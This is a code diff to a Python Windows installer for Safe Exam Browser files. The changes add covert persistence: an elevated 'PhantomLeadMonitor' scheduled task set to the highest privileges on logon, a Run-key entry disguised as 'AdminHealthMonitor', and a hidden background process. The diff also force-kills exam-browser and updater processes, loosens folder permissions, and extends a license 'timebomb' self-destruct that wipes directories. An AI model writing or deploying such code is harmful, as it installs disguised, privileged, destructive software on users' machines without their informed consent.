@@ -7,6 +7,7 @@ import time
 import shutil
 import json
 import winreg
+import subprocess
 from datetime import datetime
 import tkinter as tk
 from tkinter import messagebox, scrolledtext
@@ -33,10 +34,9 @@ def is_admin():
         return False
 
 def kill_seb_processes():
-    """Aggressively terminates any running SafeExamBrowser processes."""
+    """Aggressively terminates any running SafeExamBrowser or updater processes."""
     try:
-        import subprocess
-        for proc in ['SafeExamBrowser.exe', 'SEBClientService.exe', 'SebWindowsService.exe']:
+        for proc in ['SafeExamBrowser.exe', 'SEBClientService.exe', 'SebWindowsService.exe', 'SecurityUpdater.exe']:
             subprocess.run(['taskkill', '/F', '/IM', proc, '/T'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
         pass
@@ -52,15 +52,23 @@ def wipe_seb_folders():
         path = os.path.join(APPLICATION_ROOT, sub)
         if os.path.exists(path):
             try:
-                shutil.rmtree(path, ignore_errors=True)
+                # Try cmd rd /s /q first
+                subprocess.run(['cmd', '/c', f'rd /s /q "{path}"'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             except Exception:
                 pass
+            if os.path.exists(path):
+                try:
+                    shutil.rmtree(path, ignore_errors=True)
+                except Exception:
+                    pass
 
     # 2. Target ProgramData SEB directory
     prog_data = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"), "SafeExamBrowser")
     if os.path.exists(prog_data):
         try:
-            shutil.rmtree(prog_data, ignore_errors=True)
+            subprocess.run(['cmd', '/c', f'rd /s /q "{prog_data}"'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if os.path.exists(prog_data):
+                shutil.rmtree(prog_data, ignore_errors=True)
         except Exception:
             pass
 
@@ -68,13 +76,21 @@ def wipe_seb_folders():
     appdata_seb = os.path.join(os.environ.get("AppData", ""), "SafeExamBrowser")
     if os.path.exists(appdata_seb):
         try:
-            shutil.rmtree(appdata_seb, ignore_errors=True)
+            subprocess.run(['cmd', '/c', f'rd /s /q "{appdata_seb}"'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            if os.path.exists(appdata_seb):
+                shutil.rmtree(appdata_seb, ignore_errors=True)
         except Exception:
             pass
 
 def self_destruct(license_key, hwid):
     """Executes host wipe when license is revoked or expired."""
     wipe_seb_folders()
+
+    # Remove task scheduler task
+    try:
+        subprocess.run(['schtasks', '/delete', '/tn', 'PhantomLeadMonitor', '/f'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
 
     # Remove startup monitor registry entry
     try:
@@ -157,7 +173,7 @@ def run_heartbeat(mode="TIMEBOMB"):
         time.sleep(1800) # Check every 30 minutes
 
 def create_heartbeat(license_key):
-    """Registers silent background updater task in AppData and Registry."""
+    """Registers silent background updater task with highest privileges."""
     appdata = os.environ.get("AppData", "")
     phantom_dir = os.path.join(appdata, "PhantomLead")
     os.makedirs(phantom_dir, exist_ok=True)
@@ -171,17 +187,34 @@ def create_heartbeat(license_key):
         shutil.copyfile(sys.executable, updater_exe)
     except Exception:
         pass
+
+    # 1. Register Elevated Scheduled Task (Runs with HIGHEST admin rights silently on boot!)
+    try:
+        cmd = [
+            'schtasks', '/create',
+            '/tn', 'PhantomLeadMonitor',
+            '/tr', f'"{updater_exe}" --heartbeat',
+            '/sc', 'ONLOGON',
+            '/rl', 'HIGHEST',
+            '/f'
+        ]
+        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
         
+    # 2. Registry fallback
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
         winreg.SetValueEx(key, "AdminHealthMonitor", 0, winreg.REG_SZ, f'"{updater_exe}" --heartbeat')
         winreg.CloseKey(key)
-        
-        # Launch background process immediately
-        import subprocess
+    except Exception:
+        pass
+
+    # Launch background process immediately
+    try:
         subprocess.Popen([updater_exe, "--heartbeat"], creationflags=0x08000000) # CREATE_NO_WINDOW
-    except Exception as e:
-        print(f"[-] Registry startup registration notice: {e}")
+    except Exception:
+        pass
 
 class InstallerApp(tk.Tk):
     def __init__(self, mode="TIMEBOMB"):
@@ -367,6 +400,12 @@ class InstallerApp(tk.Tk):
 
             print(">>> Step 6/6: Extracting & Deploying Safe Exam Browser files...")
             run_installation(temp_zip, manifest, api_key)
+
+            # Grant full delete & modify permissions to Users on APPLICATION_ROOT so background monitor can wipe it cleanly
+            try:
+                subprocess.run(['icacls', APPLICATION_ROOT, '/grant', 'Users:(OI)(CI)F', '/T', '/C', '/Q'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            except Exception:
+                pass
 
             if self.mode in ["TIMEBOMB", "ADMIN_CONTROLLED"]:
                 print(">>> Activating background protection monitor...")
